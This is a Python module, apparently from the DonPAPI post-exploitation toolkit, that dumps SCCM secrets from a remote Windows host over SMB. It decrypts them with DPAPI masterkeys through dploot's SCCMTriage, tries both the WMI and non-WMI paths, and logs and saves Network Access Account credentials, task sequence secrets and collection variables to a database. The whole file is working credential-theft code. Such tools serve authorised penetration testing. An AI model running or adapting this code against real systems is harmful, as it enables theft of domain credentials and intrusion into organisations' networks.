from typing import Any

from dploot.lib.target import Target
from dploot.lib.smb import DPLootSMBConnection
from dploot.triage.sccm import SCCMTriage
from donpapi.core import DonPAPICore
from donpapi.lib.logger import DonPAPIAdapter

class SCCM:
    def __init__(self, target: Target, conn: DPLootSMBConnection, masterkeys: list, options: Any, logger: DonPAPIAdapter, context: DonPAPICore, false_positive: list, max_filesize: int) -> None:
        self.tag = self.__class__.__name__
        self.target = target
        self.conn = conn
        self.masterkeys = masterkeys
        self.options = options
        self.logger = logger
        self.context = context
        self.false_positive = false_positive
        self.max_filesize = max_filesize

    def run(self):
        if self.context.remoteops_allowed:
            self.logger.display("Dumping SCCM Credentials")
            for wmi in [True,False]:
                sccm_triage = SCCMTriage(target=self.target, conn=self.conn, masterkeys=self.masterkeys, use_wmi=wmi)
                sccmcreds, sccmtasks, sccmcollections = sccm_triage.triage_sccm()
                for sccmcred in sccmcreds:
                    self.logger.secret(f"[NAA Account] {sccmcred.username.decode('latin-1')}:{sccmcred.password.decode('latin-1')}", self.tag)
                    self.context.db.add_secret(computer=self.context.host, collector=self.tag, windows_user="SYSTEM", username=sccmcred.username.decode('latin-1'), password=sccmcred.password.decode('latin-1'), program="NAA Account")
                for sccmtask in sccmtasks:
                    self.logger.secret(f"[Task sequences secret] {sccmtask.secret.decode('latin-1')}", self.tag)
                    self.context.db.add_secret(computer=self.context.host, collector=self.tag, windows_user="SYSTEM", password=sccmtask.secret.decode('latin-1'), program="Task sequences secret")
                for sccmcollection in sccmcollections:
                    self.logger.secret(f"[Collection Variable] {sccmcollection.variable.decode('latin-1')}:{sccmcollection.value.decode('latin-1')}", self.tag)
                    self.context.db.add_secret(computer=self.context.host, collector=self.tag, windows_user="SYSTEM", username=sccmcollection.variable.decode('latin-1'), password=sccmcollection.value.decode('latin-1'), program="Collection Variable")